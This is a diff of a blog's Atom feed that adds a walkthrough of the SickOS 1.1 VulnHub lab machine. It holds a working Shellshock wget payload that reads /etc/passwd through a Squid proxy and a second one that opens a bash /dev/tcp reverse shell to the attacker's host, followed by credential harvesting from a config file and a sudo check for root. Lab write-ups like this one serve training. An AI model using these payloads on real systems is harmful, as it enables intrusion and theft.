@@ -4,7 +4,7 @@
   <title><![CDATA[Category: shellshock | Bob1Bob2]]></title>
   <link href="http://wg135.github.io/blog/categories/shellshock/atom.xml" rel="self"/>
   <link href="http://wg135.github.io/"/>
-  <updated>2016-06-09T13:26:19-05:00</updated>
+  <updated>2016-06-09T16:09:16-05:00</updated>
   <id>http://wg135.github.io/</id>
   <author>
     <name><![CDATA[Bob1Bob2]]></name>
@@ -12,6 +12,121 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[sickos:1.1]]></title>
+    <link href="http://wg135.github.io/blog/2016/05/18/sickos-1-dot-1/"/>
+    <updated>2016-05-18T12:50:37-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/05/18/sickos-1-dot-1</id>
+    <content type="html"><![CDATA[<p>From <a href="https://www.vulnhub.com/entry/csharp-vulnjson,134/">Vulhub</a></p>
+
+<h3>Tools:</h3>
+
+<ul>
+<li>netdiscover</li>
+<li>Nmap</li>
+<li>Metasploit</li>
+<li>FoxyProxy</li>
+</ul>
+
+
+<!--more-->
+
+
+<p>Use netdiscover to detect target IP address</p>
+
+<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>
+
+<p><img src="/images/blog/vulhub/sickos/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.79.178 is the target.</p>
+
+<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.79.178 -p-</code></p>
+
+<p><img src="/images/blog/vulhub/sickos/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Looks like port 22 and port 3218 are openning. Port 3218 is running Squid. open msfconsole, search squid. I found that:</p>
+
+<p><img src="/images/blog/vulhub/sickos/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Then use this module to scan the squid service:</p>
+
+<p><img src="/images/blog/vulhub/sickos/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Looks like port 80 is opened:</p>
+
+<p><img src="/images/blog/vulhub/sickos/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Use FoxyProxy add-on to configure proxy:</p>
+
+<p><img src="/images/blog/vulhub/sickos/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>now visit <a href="http://192.168.79.178">http://192.168.79.178</a></p>
+
+<p><img src="/images/blog/vulhub/sickos/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>now let&rsquo;s use nikto to scan the server:</p>
+
+<pre><code>nikto -h localhost -useproxy http://192.168.79.178:3128
+</code></pre>
+
+<p><img src="/images/blog/vulhub/sickos/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>looks like there is a shellshock vuln</p>
+
+<p>Let&rsquo;s test it:</p>
+
+<pre><code>wget -q -O- -U "() { test;};echo \"content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" -e use_proxy=on -e http_proxy=192.168.79.178:3128 "http://192.168.79.178/cgi-bin/status"
+</code></pre>
+
+<p><img src="/images/blog/vulhub/sickos/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>It works and looks  there is an account sickos.</p>
+
+<p>Now lets setup reverse shell.</p>
+
+<p>netcat-style shell access without netcat:</p>
+
+<p><code>/bin/bash -i &gt; /dev/tcp/[yourip]/[port] 0&lt;&amp;1</code></p>
+
+<p>in one terminal:</p>
+
+<p><code>nc -nlvp 4444</code></p>
+
+<p>in another terminal:</p>
+
+<pre><code>wget -q -O- -U "() { test;};echo \"content-type: text/plain\"; echo; echo; /bin/bash -i &gt; /dev/tcp/192.168.79.173/4444 0&lt;&amp;1" -e use_proxy=on -e http_proxy=192.168.79.178:3128 "http://192.168.79.178/cgi-bin/status"
+</code></pre>
+
+<p>get the shell:</p>
+
+<p><img src="/images/blog/vulhub/sickos/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>After Enumeration, got a interesting file: <code>/var/www/wolfcms/config.php</code></p>
+
+<p><img src="/images/blog/vulhub/sickos/Selection_011.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Looks like the password is <code>john@123</code></p>
+
+<p>SSH to the target server as sickos and use this password:</p>
+
+<p><img src="/images/blog/vulhub/sickos/Selection_012.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Check sickos&rsquo;s privilege:</p>
+
+<p><code>sudo -l</code></p>
+
+<p><img src="/images/blog/vulhub/sickos/Selection_013.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Looks like it can run as root</p>
+
+<p><img src="/images/blog/vulhub/sickos/Selection_014.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>YES</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Pentesterlab--CVE-2014-6271/Shellshock]]></title>
